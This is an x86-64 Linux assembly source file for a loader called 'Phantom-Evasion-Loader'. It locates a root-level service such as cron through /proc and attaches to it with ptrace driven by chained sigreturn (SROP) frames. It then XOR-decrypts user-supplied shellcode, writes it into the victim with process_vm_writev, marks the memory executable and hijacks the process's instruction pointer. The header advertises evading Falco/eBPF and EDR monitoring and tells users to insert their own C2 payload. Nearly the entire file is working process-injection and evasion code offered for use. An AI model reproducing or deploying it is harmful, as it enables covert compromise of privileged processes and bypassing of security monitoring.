; ======================================================================================================
;  :::::::::  :::    :::     :::     ::::    ::: ::::::::::: ::::::::  ::::    ::::  
;  :+:    :+: :+:    :+:   :+: :+:   :+:+:   :+:     :+:    :+:    :+: +:+:+: :+:+:+ 
;  +:+    +:+ +:+    +:+  +:+   +:+  :+:+:+  +:+     +:+    +:+    +:+ +:+ +:+:+ +:+ 
;  +#++:++#+  +#++:++#++ +#++:++#++: +#+ +:+ +#+     +#+    +#+    +#+ +#+  +:+  +#+ 
;  +#+        +#+    +#+ +#+     +#+ +#+  +#+#+#     +#+    +#+    +#+ +#+       +#+ 
;  #+#        #+#    #+# #+#     #+# #+#   #+#+#     #+#    #+#    #+# #+#       #+# 
;  ###        ###    ### ###     ### ###    ####     ###     ########  ###       ### 
;
;  :::::::::: :::     :::     :::      ::::::::  ::::::::::: ::::::::  ::::    ::: 
;  :+:        :+:     :+:   :+: :+:   :+:    :+:     :+:    :+:    :+: :+:+:   :+: 
;  +:+        +:+     +:+  +:+   +:+  +:+            +:+    +:+    +:+ :+:+:+  +:+ 
;  +#++:++#   +#+     +:+ +#++:++#++: +#++:++#++     +#+    +#+    +#+ +#+ +:+ +#+ 
;  +#+         +#+   +:+  +#+     +#+        +#+     +#+    +#+    +#+ +#+  +:+  +#+ 
;  #+#          #+# #+#   #+#     #+# #+#    #+#     #+#    #+#    #+# #+#   #+#+# 
;  ##########    ###      ###     ###  ########  ########### ########  ###    #### 
; ======================================================================================================
; Project      : Phantom-Evasion-Loader (Standalone x64)
; Author       : JM00NJ (https://github.com/JM00NJ) / https://netacoding.com/
; Architecture : x86_64 Linux (Advanced Process Injector)
; License : GNU AGPLv3 (Proprietary licensing available on request)
; ------------------------------------------------------------------------------------------------------
; Features:
;   - Stealth Injection : Significantly reduces detection surface on Falco eBPF/EDRs.
;   - SROP Execution    : Uses rt_sigreturn (Syscall 15) to minimize ptrace noise and context hijacking.
;   - Zero-Copy Inj.    : Leverages process_vm_writev (Syscall 311) to bypass PTRACE_POKEDATA monitoring.
;   - Obfuscation       : Features In-Memory Runtime Decryption (XOR). Payload must be encrypted!
; ------------------------------------------------------------------------------------------------------
; [!] IMPORTANT NOTE FOR USERS:
; This loader is provided WITHOUT a default payload for safety and modularity.
; 1. To test, insert your x64 PIC shellcode into 'c2_payload' below.
; 2. Ensure your payload is XOR-encrypted with the key '0xACDAABBBA2BC1337'.
; 3. Update the payload size (currently set to placeholder 1632) in Phase 3.
; For a full-scale integration test, visit: https://github.com/JM00NJ/ICMP-Ghost-A-Fileless-x64-Assembly-C2-Agent
; ======================================================================================================


section .bss
	data_directory resb 2048
	comm_buffer resb 16
	user_regs_struct resb 216
	working_user_regs_struct resb 216				; we need that if we dont want to manually fix user_regs_struck
	c2_address resq 1
	original_code resq 1
    epilogue_buffer resb 16
    original_rip_addr resq 1
    local_iov  resq 2   ; 2 QWORD (16 byte)
    remote_iov resq 2   ; 2 QWORD (16 byte)
section .data
	proc_path db "/proc",0
	; ===========================================================================
    ; [TARGET CONFIGURATION]
    ; You can change this to any root-level service name (e.g., "sshd", "dbus").
    ; WARNING: Ensure the chosen service is NOT confined by AppArmor or SELinux.
    ; If the target has a strict security profile, ptrace injection will be 
    ; blocked (EPERM) and the loader will fail. Choose your host carefully!
    ; CHECK THE LINE 265
    ; ===========================================================================
	target db "cron", 10						
	comm_file db "comm", 0
	sleep_time:
    dq 0              ; tv_sec (64-bit integer for seconds)
    dq 1              ; tv_nsec (64-bit integer for nanoseconds)
	c2_payload:
      db 0x90, 0x90, 0x90, 0x90 ; Placeholder (Replace with your shellcode)







        
section .text

global _start


_start:
	

	sub rsp, 512			; 256 bytelik yer
	cld                     ; Direction flag temizle, ileri yaz
	mov rdi, rsp
	xor rax, rax
	mov rcx, 64				; 512 / 64 = 8
	rep stosq
	mov rbp, rsp			; anchor


locate_pid:
	xor rdx,rdx
	mov rax, 1
	add rax, 1              ; sys_open
	lea rdi, [proc_path]    ; "/proc"
	mov rsi, 0x10000        ; O_RDONLY | O_DIRECTORY
	syscall
	mov r12, rax
	
get_sys_getdents64:
	mov rax, 101
	add rax, 116
	mov rdi, r12
	lea rsi, [data_directory]
	mov rdx, 2048
	syscall
	test rax,rax
	js _exit
	jz _exit
	mov r13,rax
	xor r14,r14
	
_parse_loop:
	lea rbx, [data_directory + r14]		;Directory starter pointer
	movzx eax, byte [rbx + 19]			; OFFSET 19 = STARTER OF THE FILE NAME
	; HUNTING FOR THE PID
	sub al, '0'
	cmp al, 9
	ja _next_entry
	jmp _check_comm_file

_next_entry:
	movzx eax, word [rbx + 16]
	add r14, rax
	
	cmp r14, r13
	jl _parse_loop
	
	jmp get_sys_getdents64
	
	
	
	
_check_comm_file:
	mov rax, 200
	add rax, 57			;sys_openat
	mov rdi, r12
	mov rdx, 0x10000
	lea rsi, [rbx + 19]
	syscall
	test rax, rax
	js _next_entry
	mov r8,rax
	
	mov rax, 200
	add rax, 57			;sys_openat
	mov rdi, r8
	lea rsi, [comm_file]
	xor rdx,rdx
	syscall
	test rax, rax
	js _close

	push rax
	xor rax,rax
	pop rdi
	lea rsi, [comm_buffer]
	mov rdx, 16
	syscall
	push rdi
	test rax,rax
	js _close_both
	
	cld
	lea rsi, [target]
	lea rdi, [comm_buffer]
	; ===========================================================================
    ; [TARGET LENGTH MATCHING] -> Update this if you change the target name!
    ; This value MUST equal: (Length of the service name) + 1 (for the newline).
    ; Example: "cron" (4 letters) + 1 (newline) = 5.
    ; If you change the target to "VBoxService", this value must be 12.
    ; ===========================================================================
	mov rcx, 5				; testing cron
	repe cmpsb
	je _target_found

_close_both:
	mov rax, 3
	pop rdi
	syscall

_close:
	mov rax, 3			;sys_close
	mov rdi, r8
	syscall
	jmp _next_entry
_exit:
	mov rax,60
	xor rdi,rdi
	syscall

; ==========================================
;  TARGET FOUND - TIME TO PAYLOAD
; ==========================================
_target_found:
	; close the fd's and pids files
	mov rax, 3			; sys_close
	pop rdi				; Stack comm FD
	syscall
	
	mov rax, 3			; sys_close
	mov rdi, r8			; R8 PID FILE
	syscall

	lea rsi, [rbx + 19]
	xor rcx, rcx              
    xor rax, rax
_atoi_loop:
	lodsb
	test al, al
	jz _atoi_done
	
	sub al, '0'
	imul rcx, 10
	add rcx, rax
	
	jmp _atoi_loop

_atoi_done:
	mov r13, rcx
	;SROP1
	mov qword[rbp + 0x90], 101 		; sys_ptrace
	mov qword[rbp + 0x68], 16		;PTRACE_ATTACH
	mov [rbp + 0x70], r13		; pid number that we got from _atoi_loop
	
	mov [rbp + 0x50], r13           ; R13'ü (PID) SROP'tan sağ çıkar
    mov [rbp + 0x78], rbp           ; RBP'yi (Anchor) SROP'tan sağ çıkar
	
	mov qword [rbp + 0xB0], 0x202   ; EFLAGS = 0x202 (Interrupt enable)
    mov qword [rbp + 0xB8], 0x33     ; CS = 0x33 (64-bit User Code Segment)
	
	lea rax, [rbp + 256]			;
    mov [rbp + 0xA0], rax
	
	lea rax, [rel x_syscall]	; syscall i cagirmak icin atlayacagi yer
    mov [rbp + 0xA8], rax
	mov rax, 15             ; sys_rt_sigreturn
    syscall					; kernel hacked / RBP DE KI DEGERLER CPU YA GIDIYOR
	
x_syscall:
	syscall
	
_wait:	
	mov rax, 59
	add rax, 2			; sys_wait4
	mov rdi, r13		; pid number that we got from _atoi_loop
	xor rsi, rsi		; we dont need wstatus
	mov rdx, 1
	xor r10,r10
	syscall
	
	mov r15, rax		; saving the pid number if error happens
	mov rax, 39
	xor rdi, rdi
	xor rsi, rsi
	test r15, r15
	
	;Polymorphic Syscall Execution Boyle bir sey varmis kurcalarken yeniden bulmus oldum :D
	mov rbx, 35			; burada zıplama bracnh yapmadan sinsice bir şeyler yapıyoruz / doing something insidiously skipping jmp and branch
	cmovz rax, rbx
	cmovs rax, rbx
	lea r8, [sleep_time]
	mov r9, 0
	cmovz rdi, r8
	cmovz rsi, r9
	cmovs rdi, r8
	cmovs rsi, r9
	syscall
	test r15,r15
	jle _wait

	;SROP2
	mov qword[rbp + 0x68], 12		;GETREGS simdi ekledim SROP icin duzenliyorum
	lea rax, [rel user_regs_struct]
	mov [rbp + 0x38], rax			; ; R10 = struct adresi
	lea rax, [rbp + 256]			;
    mov [rbp + 0xA0], rax

	mov [rbp + 0x50], r13           ; R13'ü (PID) SROP'tan sağ çıkar
    mov [rbp + 0x78], rbp           ; RBP'yi (Anchor) SROP'tan sağ çıkar

	lea rax, [rel y_syscall]	; syscall i cagirmak icin atlayacagi yer
    mov [rbp + 0xA8], rax
    
    mov rsp, rbp
	mov rax, 10                         ; sys_rt_sigreturn
	add rax, 5
    syscall                             ; KERNEL TEKRAR HACKLEND

y_syscall:
	syscall
	
	; ==========================================================
    ; 🛡️ Kurbanın orijinal RIP adresini bir kez al
    ; ve SROP'un asla silemeyeceği BSS e at
    ; ==========================================================
    mov rax, qword [rel user_regs_struct + 128]
    mov qword [rel original_rip_addr], rax
	
	
	; --- SROP3 --- Hazirligi
	mov qword[rbp + 0x68], 2				;mov rdi, 2 / PTRACE_PEEKDATA OR PTRACE_PEEKTEXT / 2-1 - if i understand correctly they both same thing names are diffrent cause of the legacy 
	mov rax, [rel user_regs_struct + 128]	; mov rdx, [user_regs_struct + 128] ; Target RIP adress on 128 byte
	mov [rbp + 0x88], rax
	lea rax, [rel original_code]
	mov [rbp + 0x38], rax
	lea rax, [rel z_syscall]
    mov [rbp + 0xA8], rax
	mov rsp, rbp
	mov rax, 9								; sys_rt_sigreturn
	add rax, 6
	syscall									; KERNEL TEKRAR HACKLEND

z_syscall:
    syscall                         ; PEEKDATA bitti, kurbanın kodu RAX'ta

    ; --- SROP4 (POKEDATA) Hazirligi---
    ; NOT: RDX (0x88) zaten SROP3'ten beri kurbanın RIP adresini tutuyor. 
    mov rax, [rel user_regs_struct + 128] ; Kurbanın RIP adresi (Adres lazım!)
    mov [rbp + 0x88], rax                 ; RDX = Yazılacak Hedef Adres

    mov qword [rbp + 0x68], 5             ; RDI = PTRACE_POKEDATA (5)
    mov qword [rbp + 0x38], 0x050F        ; R10 = Yazılacak Veri (Opcode)
    
    ; RIP ve RSP zaten çerçevede doğru yerleri (x1_syscall ve rbp+256) gösteriyor
    lea rax, [rel x1_syscall]             ; jmp yapacagi yer
    mov [rbp + 0xA8], rax
	mov rsp, rbp
    mov rax, 15                           ; sys_rt_sigreturn
    syscall                               ; KERNEL TEKRAR HACKLENDİ

x1_syscall:
    syscall                               ; POKEDATA Çalıştı! (0x050F yazıldı)
	
	; check notes on github for offsets.
	mov qword [user_regs_struct + 80], 9      ; RAX = 9
	mov qword [user_regs_struct + 112], 0     ; RDI = NULL Adres
	mov qword [user_regs_struct + 104], 0x800000  ; RSI = 8000 Bayt Boyut shellcode
	mov qword [user_regs_struct + 96], 3	  ; RDX = 3 (PROT_READ | PROT_WRITE) / W^X (Write XOR Execute) check for = MITRE ATT&CK T1055 
	mov qword [user_regs_struct + 56], 0x22	  ; R10 = (MAP_PRIVATE | MAP_ANONYMOUS)
	mov qword [user_regs_struct + 72], 0xFFFFFFFFFFFFFFFF ; R8 = -1 = (0xFFFFFFFFFFFFFFFF) anonymous fd 
	mov qword [user_regs_struct + 64], 0		  ; R9 = 0
	
	mov rax, [rbp + 0x88]                 ; O doğru adresi RAX'a çek
    mov [user_regs_struct + 128], rax     ; Ve struct'ın RIP ofsetine bas	burada yarrak kurek bir hata oluyordu o yuzden kalkan ekledim diyelim
	
	mov qword[rbp + 0x68], 13				; PTRACE_SETREGS
											;mov rsi, r13
	lea rax, [rel user_regs_struct]			; lea r10, [user_regs_struct]
	mov [rbp + 0x38], rax
	lea rax, [rel x2_syscall]             ; jmp yapacagi yer
    mov [rbp + 0xA8], rax
	mov rsp, rbp
    mov rax, 15                           ; sys_rt_sigreturn
    syscall                               ; KERNEL TEKRAR HACKLENDİ

x2_syscall:
	syscall

	mov qword[rbp + 0x68], 9		;mov rdi, 9			; PTRACE_SINGLESTEP
	mov qword[rbp + 0x88], 0		; xor rdx, rdx
	mov qword[rbp + 0x38], 0		;xor r10, r10
	lea rax, [rel x3_syscall]             ; jmp yapacagi yer
    mov [rbp + 0xA8], rax
	mov rsp, rbp
    mov rax, 15                           ; sys_rt_sigreturn
    syscall     


x3_syscall:
	syscall
_wait2:
	mov rax, 58
	add rax, 3			; sys_wait4
	mov rdi, r13		; r13 = target PID
	xor rsi, rsi		; we dont need wstatus
	mov rdx, 1
	xor r10,r10
	syscall
	
	mov r15, rax		; saving the pid number if error happens
	mov rax, 39
	xor rdi, rdi
	xor rsi, rsi
	test r15, r15
	
	;Polymorphic Syscall Execution Boyle bir sey varmis kurcalarken yeniden bulmus oldum :D
	mov rbx, 35			; burada zıplama bracnh yapmadan sinsice bir şeyler yapıyoruz / doing something insidiously skipping jmp and branch
	cmovz rax, rbx
	cmovs rax, rbx
	lea r8, [sleep_time]
	mov r9, 0
	cmovz rdi, r8
	cmovz rsi, r9
	cmovs rdi, r8
	cmovs rsi, r9
	syscall
	test r15,r15
	jle _wait2

	mov qword[rbp + 0x68], 12			; GETREGS
	mov rsi, r13		; r13 = target PID
	lea rax, [rel working_user_regs_struct] 	;lea r10, [working_user_regs_struct]
	mov [rbp + 0x38], rax
	lea rax, [rel x4_syscall]             ; jmp yapacagi yer
    mov [rbp + 0xA8], rax
    mov rsp, rbp
    mov rax, 15                           ; sys_rt_sigreturn
	syscall
	

x4_syscall:
	syscall
	mov rbx, qword [working_user_regs_struct + 80]
	mov qword [c2_address], rbx
	
	
	
; =========================================================================
    ; PHASE 3: PAYLOAD DECRYPTION & INJECTION (The 'process_vm_writev' Way)
    ; =========================================================================
    
    ; 1. ÖNCE LOADER'IN KENDİ İÇİNDE ŞİFREYİ ÇÖZ (In-Memory Decryption)
    ; Not: .data section writable (RW) olmalıdır, veya veriyi .bss'e kopyalayıp çözmelisin.
    ; Varsayalım c2_payload .data içinde değiştirilebilir durumda (W^X sorunu yoksa):
    
    mov r12, 1632
    lea r9, [rel c2_payload]
    mov r14, 0xACDAABBBA2BC1337  ; TAM 8 Bayt (QWORD) Anahtar

_decrypt_local_loop:
    mov r10, [r9]
    xor r10, r14                 ; Şifreyi çöz
    mov [r9], r10                ; Çözülmüş veriyi Loader'ın kendi belleğine geri yaz!
    
    add r9, 8
    sub r12, 8
    jg _decrypt_local_loop

    ;(process_vm_writev)
    
    lea rax, [rel c2_payload]
    mov [rel local_iov], rax          ; iov_base = c2_payload adresi
    mov qword [rel local_iov + 8], 1632 ; iov_len = Shellcode boyutu

    mov rbx, qword [c2_address]       ; mmap'ten dönen güvenli alan
    mov [rel remote_iov], rbx         ; iov_base = Hedef adres
    mov qword [rel remote_iov + 8], 1632 ; iov_len = Yazılacak boyut

    ; Syscall 311 Ateşle!
    mov rax, 311                      ; sys_process_vm_writev
    mov rdi, r13                      ; Hedef PID
    lea rsi, [rel local_iov]          ; Local IOV struct adresi
    mov rdx, 1                        ; 1 adet local IOV
    lea r10, [rel remote_iov]         ; Remote IOV struct adresi
    mov r8, 1                         ; 1 adet remote IOV
    mov r9, 0                         ; Flags (0)
    syscall
	
x5_syscall:
	syscall
	add r9, 8
	add rbx, 8
	sub r12, 8
	jg _decrypt_local_loop
	
	mov qword[rbp + 0x68], 12  ; GETREGS
	mov qword[rbp + 0x88], 0
	lea rax, [rel working_user_regs_struct]
	mov [rbp + 0x38], rax
	
	lea rax, [rel x6_syscall]             ; jmp yapacagi yer
    mov [rbp + 0xA8], rax
    mov rsp, rbp
    mov rax, 15                           ; sys_rt_sigreturn
	syscall

x6_syscall:
	syscall
	
	; PHASE 4
	mov rbx, qword [c2_address]
	
	mov qword [working_user_regs_struct + 80], 10      ; RAX = 10  sys_mprotect
	mov qword [working_user_regs_struct + 112], rbx	
	mov qword [working_user_regs_struct + 96], 7        ; RDX = 7 (READ|WRITE|EXEC)	;mov qword [working_user_regs_struct + 96], 5		; (PROT_READ | PROT_EXEC)
	mov qword [working_user_regs_struct + 104], 0x800000
	
	
	mov rbx, qword [working_user_regs_struct + 128]
	sub rbx, 2                                       
	mov qword [working_user_regs_struct + 128], rbx

	mov qword[rbp + 0x68], 13	; PTRACE_SETREGS

	lea rax, [rel working_user_regs_struct]
	mov [rbp + 0x38], rax
	
	lea rax, [rel x7_syscall]             ; jmp yapacagi yer
    mov [rbp + 0xA8], rax
    mov rsp, rbp
    mov rax, 15                           ; sys_rt_sigreturn
	syscall

x7_syscall:
	syscall

	mov qword[rbp + 0x68], 9	; PTRACE_SINGLESTEP
	mov qword[rbp + 0x88], 0
	mov qword[rbp + 0x38], 0
	lea rax, [rel x8_syscall]             ; jmp yapacagi yer
    mov [rbp + 0xA8], rax
    mov rsp, rbp
    mov rax, 15                           ; sys_rt_sigreturn
	syscall
	
x8_syscall:
	syscall

	mov rax, 58
	add rax, 3			; sys_wait4
	mov rdi, r13		; r13 = target PID
	xor rsi, rsi		; we dont need wstatus
	xor rdx, rdx
	xor r10,r10
	syscall
	

	
	mov qword[rbp + 0x68], 5	; PTRACE_POKEDATA - WRITE = 5
	mov rax, [rel user_regs_struct + 128]
	mov [rbp + 0x88], rax
	mov rax, [rel original_code]
	mov [rbp + 0x38], rax
	lea rax, [rel x9_syscall]             ; jmp yapacagi yer
    mov [rbp + 0xA8], rax
    mov rsp, rbp
    mov rax, 15                           ; sys_rt_sigreturn
	syscall
	
x9_syscall:
    syscall

    mov rax, qword [user_regs_struct + 128]
    mov qword [rel original_rip_addr], rax

    mov rbx, qword [c2_address]
    mov qword [user_regs_struct + 128], rbx
    
    mov qword [user_regs_struct + 80], 0 ; Shellcode başladığında RAX=0 olsun
    

    mov qword[rbp + 0x68], 13   ; PTRACE_SETREGS
    lea rax, [rel user_regs_struct]
    mov [rbp + 0x38], rax
    lea rax, [rel x10_syscall]             
    mov [rbp + 0xA8], rax
    mov rsp, rbp
    mov rax, 15                           
    syscall
x10_syscall:
    syscall

    mov byte [epilogue_buffer], 0x48
    mov byte [epilogue_buffer + 1], 0xB9
    
    mov rax, qword [rel original_rip_addr]
    add rax, 2
    mov [epilogue_buffer + 2], rax
    
    mov byte [epilogue_buffer + 10], 0x6A ; push
    mov byte [epilogue_buffer + 11], 0xFC ; -4
    mov byte [epilogue_buffer + 12], 0x58 ; pop rax
    mov byte [epilogue_buffer + 13], 0xFF ; jmp rcx
    mov byte [epilogue_buffer + 14], 0xE1
    mov byte [epilogue_buffer + 15], 0x90 ; NOP
    
    ; --- 1. POKEDATA (İlk 8 Bayt) ---
    mov rbx, qword [c2_address]
    add rbx, 1632                   ; Payload Bitişi!
    
    mov qword [rbp + 0x68], 5       ; PTRACE_POKEDATA
    mov [rbp + 0x88], rbx           ; RDX = Yazılacak Adres
    mov rax, [epilogue_buffer]      
    mov [rbp + 0x38], rax           
    
    lea rax, [rel write_epi_1]
    mov [rbp + 0xA8], rax           
    mov rsp, rbp
    mov rax, 15                     
    syscall

write_epi_1:
    syscall

    ; --- 2. POKEDATA (Kalan 8 Bayt) ---
    mov rbx, qword [c2_address]
    add rbx, 1640                   ; Payload Bitişi + 8 Bayt!
    
    mov qword [rbp + 0x68], 5       ; PTRACE_POKEDATA
    mov [rbp + 0x88], rbx           
    mov rax, [epilogue_buffer + 8]  
    mov [rbp + 0x38], rax           
    
    lea rax, [rel write_epi_2]
    mov [rbp + 0xA8], rax           
    mov rsp, rbp
    mov rax, 15                     
    syscall

write_epi_2:
    syscall

    ; --- PTRACE_DETACH ---
    mov qword[rbp + 0x68], 17   
    mov qword[rbp + 0x88], 0 
    mov qword[rbp + 0x38], 0
    lea rax, [rel x11_syscall]             
    mov [rbp + 0xA8], rax
    mov rsp, rbp
    mov rax, 15                           
    syscall
x11_syscall:
    syscall
_exit_loader:
    mov rax, 60     ; sys_exit
    xor rdi, rdi    ; return 0
    syscall
